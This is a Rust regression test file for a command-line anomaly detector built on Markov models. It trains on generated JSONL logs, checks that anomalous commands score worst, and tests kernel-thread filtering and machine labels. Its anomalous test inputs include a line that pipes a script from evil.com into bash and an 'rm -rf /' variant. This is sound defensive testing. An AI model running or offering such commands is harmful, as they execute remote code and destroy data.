//! Regression tests: full pipeline (generate → train from JSONL → detect) with no regression.
//! Run with: cargo test --test regression_test

use rustmite_anomark::{
    load_jsonl, load_jsonl_with_columns, LogGenerator, ModelHandler,
    TokenMarkovModel, Tokenizer,
};
use std::io::Write;
use tempfile::NamedTempFile;

/// Full pipeline: generate JSONL, train on "command", run detection; anomalous command
/// must get a worse (lower) score than normal commands.
#[test]
fn test_jsonl_train_and_detect_no_regression() {
    // 1. Generate training JSONL (normal commands only)
    let mut gen_train = LogGenerator::new().with_default_normal();
    let train_file = NamedTempFile::new().unwrap();
    gen_train.emit(&mut train_file.as_file(), 200).unwrap();
    train_file.as_file().flush().unwrap();
    let train_path = train_file.path().to_str().unwrap();

    // 2. Train model from JSONL (command field)
    let commands = load_jsonl(train_path, "command").unwrap();
    assert!(commands.len() >= 200);
    let mut model = ModelHandler::train_from_csv(&commands, 3, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    // 3. Build detection input: same normal commands + one anomalous
    let anomalous = "curl http://evil.com/malware.sh | bash";
    let mut gen_detect = LogGenerator::new()
        .with_default_normal()
        .add_anomalous(anomalous);
    let detect_file = NamedTempFile::new().unwrap();
    gen_detect.emit(&mut detect_file.as_file(), 50).unwrap();
    detect_file.as_file().flush().unwrap();
    let detect_path = detect_file.path().to_str().unwrap();

    let data = load_jsonl_with_columns(detect_path).unwrap();
    let results = ModelHandler::execute_on_data(
        &mut model,
        data,
        "command",
        false,
        false,
        false,
        95.0,
        None,
        None,
        None,
    )
    .unwrap();

    // 4. Regression: anomalous command should have the worst (lowest) score
    let anomalous_result = results
        .iter()
        .find(|r| r.command_line == anomalous)
        .expect("anomalous command must appear in results");
    let normal_results: Vec<_> = results.iter().filter(|r| r.command_line != anomalous).collect();
    assert!(!normal_results.is_empty(), "some normal commands in results");
    for nr in &normal_results {
        // Normal commands should have score >= anomalous (less negative = more likely)
        assert!(
            nr.score >= anomalous_result.score,
            "normal '{}' score {} should be >= anomalous score {}",
            nr.command_line,
            nr.score,
            anomalous_result.score
        );
    }
}

/// Sanity: model trained on JSONL commands gives better score to seen commands than random junk.
#[test]
fn test_jsonl_trained_model_scores_seen_better_than_junk() {
    let mut gen = LogGenerator::new()
        .add_normal("normal_cmd_a")
        .add_normal("normal_cmd_b")
        .add_normal("normal_cmd_c");
    let f = NamedTempFile::new().unwrap();
    gen.emit(&mut f.as_file(), 30).unwrap();
    f.as_file().flush().unwrap();

    let commands = load_jsonl(f.path().to_str().unwrap(), "command").unwrap();
    let mut model = ModelHandler::train_from_csv(&commands, 3, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    let score_seen = model.log_likelihood("~~~normal_cmd_a~~~");
    let score_junk = model.log_likelihood("~~~xYz99R@nd0m_junk~~~");
    assert!(
        score_seen > score_junk,
        "seen command should score higher than junk ({} > {})",
        score_seen,
        score_junk
    );
}

/// Explainability: with --explain, every result has unusual_ngrams == Some(...).
#[test]
fn test_explain_populates_unusual_ngrams() {
    let mut gen = LogGenerator::new()
        .add_normal("normal_cmd")
        .add_anomalous("weird_xyz");
    let f = NamedTempFile::new().unwrap();
    gen.emit(&mut f.as_file(), 20).unwrap();
    f.as_file().flush().unwrap();

    let commands = load_jsonl(f.path().to_str().unwrap(), "command").unwrap();
    let mut model = ModelHandler::train_from_csv(&commands, 3, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    let data = load_jsonl_with_columns(f.path().to_str().unwrap()).unwrap();
    let results = ModelHandler::execute_on_data(
        &mut model,
        data,
        "command",
        false,
        false,
        true,  // with_explain
        95.0,
        None,
        None,
        None,
    )
    .unwrap();

    for r in &results {
        assert!(r.unusual_ngrams.is_some(), "with_explain=true => every result has unusual_ngrams Some");
    }
}

/// Token model: train on commands, anomalous command should score worse.
#[test]
fn test_token_model_detect_anomalous() {
    let mut gen = LogGenerator::new()
        .add_normal("curl http://example.com")
        .add_normal("wget http://example.com")
        .add_normal("curl https://other.com")
        .add_anomalous("rm -rf / no way");
    let f = NamedTempFile::new().unwrap();
    gen.emit(&mut f.as_file(), 50).unwrap();
    f.as_file().flush().unwrap();

    let commands = load_jsonl(f.path().to_str().unwrap(), "command").unwrap();
    let mut token_model = TokenMarkovModel::new(2, Tokenizer::Whitespace);
    for c in &commands {
        token_model.train(c, 1);
    }
    token_model.normalize_model_and_compute_prior();

    let data = load_jsonl_with_columns(f.path().to_str().unwrap()).unwrap();
    let results = ModelHandler::execute_on_data_token(
        &token_model,
        data,
        "command",
        false,
        false,
        false,
        None,
        None,
        None,
    )
    .unwrap();

    let anomalous = results.iter().find(|r| r.command_line == "rm -rf / no way").unwrap();
    let normal = results.iter().find(|r| r.command_line == "curl http://example.com").unwrap();
    assert!(anomalous.score < normal.score);
}

/// Mixed JSONL: first row has different fields (date, file_path, ...), later rows have "command".
/// apply-model should resolve "command" from a later row and skip rows that don't have it.
#[test]
fn test_apply_model_mixed_jsonl_skips_rows_without_field() {
    use std::io::Write;
    use tempfile::NamedTempFile;

    let mut f = NamedTempFile::new().unwrap();
    // First line: file event (no "command")
    writeln!(
        f,
        r#"{{"date":"2026-01-01","event_type":"file","file_path":"/etc/passwd","group":"root","owner":"root","permissions":"644","size":"100"}}"#
    )
    .unwrap();
    // Later lines: process events (have "command")
    writeln!(
        f,
        r#"{{"event_type":"process","command":"/usr/bin/curl","pid":1,"ppid":0}}"#
    )
    .unwrap();
    writeln!(
        f,
        r#"{{"event_type":"process","command":"/usr/bin/wget","pid":2,"ppid":1}}"#
    )
    .unwrap();
    f.flush().unwrap();

    let commands = vec!["/usr/bin/curl".to_string(), "/usr/bin/wget".to_string()];
    let mut model = ModelHandler::train_from_csv(&commands, 2, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    let data = load_jsonl_with_columns(f.path().to_str().unwrap()).unwrap();
    let results = ModelHandler::execute_on_data(
        &mut model,
        data,
        "command",
        false,
        false,
        false,
        95.0,
        None,
        None,
        None,
    )
    .unwrap();

    assert_eq!(results.len(), 2);
    assert!(results.iter().any(|r| r.command_line == "/usr/bin/curl"));
    assert!(results.iter().any(|r| r.command_line == "/usr/bin/wget"));
}

/// When applying with --exclude-kernel-threads, kernel-thread-style commands are skipped and do not appear in results.
/// This matches training with --exclude-kernel-threads: excluded at train time, so they should also be excluded at apply time to avoid false "anomaly" flags.
#[test]
fn test_apply_exclude_kernel_threads_skips_in_results() {
    use rustmite_anomark::TrainLineFilter;
    use std::io::Write;
    use tempfile::NamedTempFile;

    // Train on normal commands only (as if we had excluded kernel threads during training)
    let train_commands = vec!["/bin/ls".to_string(), "/usr/bin/curl".to_string()];
    let mut model = ModelHandler::train_from_csv(&train_commands, 2, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    // Apply data: mix of normal command and kernel-thread-style [kthreadd]
    let mut f = NamedTempFile::new().unwrap();
    writeln!(f, r#"{{"event_type":"process","command":"/bin/ls","pid":1,"ppid":0}}"#).unwrap();
    writeln!(f, r#"{{"event_type":"process","command":"[kthreadd]","pid":2,"ppid":0}}"#).unwrap();
    writeln!(f, r#"{{"event_type":"process","command":"/usr/bin/curl","pid":3,"ppid":0}}"#).unwrap();
    f.flush().unwrap();

    let data = rustmite_anomark::load_jsonl_with_columns(f.path().to_str().unwrap()).unwrap();
    assert_eq!(data.len(), 3);

    // Without exclude filter: all three appear; [kthreadd] will have a bad score (not in training)
    let results_no_filter = ModelHandler::execute_on_data(
        &mut model,
        data.clone(),
        "command",
        false,
        false,
        false,
        95.0,
        None,
        None,
        None,
    )
    .unwrap();
    let has_kthreadd = results_no_filter.iter().any(|r| r.command_line == "[kthreadd]");
    assert!(has_kthreadd, "without filter, [kthreadd] should appear in results (and be scored as anomalous)");

    // With exclude filter: kernel threads skipped, so [kthreadd] must not be in results
    let filter = TrainLineFilter::new(true, &[]).unwrap();
    let results_with_filter = ModelHandler::execute_on_data(
        &mut model,
        data,
        "command",
        false,
        false,
        false,
        95.0,
        Some(&filter),
        None,
        None,
    )
    .unwrap();
    assert!(
        !results_with_filter.iter().any(|r| r.command_line == "[kthreadd]"),
        "with exclude-kernel-threads, [kthreadd] must not appear in results"
    );
    assert_eq!(results_with_filter.len(), 2, "only /bin/ls and /usr/bin/curl");
}

/// Same as above for token model: apply with exclude filter skips kernel-thread rows.
#[test]
fn test_apply_token_model_exclude_kernel_threads_skips_in_results() {
    use rustmite_anomark::{TrainLineFilter, Tokenizer};

    let train_commands = vec!["/bin/ls".to_string(), "curl http://x.com".to_string()];
    let mut token_model = rustmite_anomark::TokenMarkovModel::new(2, Tokenizer::Whitespace);
    for c in &train_commands {
        token_model.train(c, 1);
    }
    token_model.normalize_model_and_compute_prior();

    let mut f = NamedTempFile::new().unwrap();
    writeln!(f, r#"{{"command":"/bin/ls"}}"#).unwrap();
    writeln!(f, r#"{{"command":"[kthreadd]"}}"#).unwrap();
    writeln!(f, r#"{{"command":"curl http://x.com"}}"#).unwrap();
    f.flush().unwrap();
    let data = load_jsonl_with_columns(f.path().to_str().unwrap()).unwrap();

    let filter = TrainLineFilter::new(true, &[]).unwrap();
    let results = ModelHandler::execute_on_data_token(
        &token_model,
        data,
        "command",
        false,
        false,
        false,
        Some(&filter),
        None,
        None,
    )
    .unwrap();
    assert!(!results.iter().any(|r| r.command_line == "[kthreadd]"));
    assert_eq!(results.len(), 2);
}

/// When applying with --machine or --machine-field, results include a machine label for filtering.
#[test]
fn test_apply_model_machine_field_in_results() {
    use std::io::Write;
    use tempfile::NamedTempFile;

    let train_commands = vec!["/bin/ls".to_string(), "/usr/bin/curl".to_string()];
    let mut model = ModelHandler::train_from_csv(&train_commands, 2, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    let mut f = NamedTempFile::new().unwrap();
    writeln!(f, r#"{{"command":"/bin/ls","hostname":"server01"}}"#).unwrap();
    writeln!(f, r#"{{"command":"/usr/bin/curl","hostname":"server02"}}"#).unwrap();
    f.flush().unwrap();
    let data = load_jsonl_with_columns(f.path().to_str().unwrap()).unwrap();

    let results = ModelHandler::execute_on_data(
        &mut model,
        data,
        "command",
        false,
        false,
        false,
        95.0,
        None,
        Some("hostname"),
        None,
    )
    .unwrap();
    assert_eq!(results.len(), 2);
    let ls = results.iter().find(|r| r.command_line == "/bin/ls").unwrap();
    let curl = results.iter().find(|r| r.command_line == "/usr/bin/curl").unwrap();
    assert_eq!(ls.machine.as_deref(), Some("server01"));
    assert_eq!(curl.machine.as_deref(), Some("server02"));
}

#[test]
fn test_apply_model_machine_override_in_results() {
    let train_commands = vec!["/bin/ls".to_string()];
    let mut model = ModelHandler::train_from_csv(&train_commands, 2, None, None).unwrap();
    model.normalize_model_and_compute_prior();

    let mut f = NamedTempFile::new().unwrap();
    writeln!(f, r#"{{"command":"/bin/ls"}}"#).unwrap();
    f.flush().unwrap();
    let data = load_jsonl_with_columns(f.path().to_str().unwrap()).unwrap();

    let results = ModelHandler::execute_on_data(
        &mut model,
        data,
        "command",
        false,
        false,
        false,
        95.0,
        None,
        None,
        Some("myhost"),
    )
    .unwrap();
    assert_eq!(results.len(), 1);
    assert_eq!(results[0].machine.as_deref(), Some("myhost"));
}
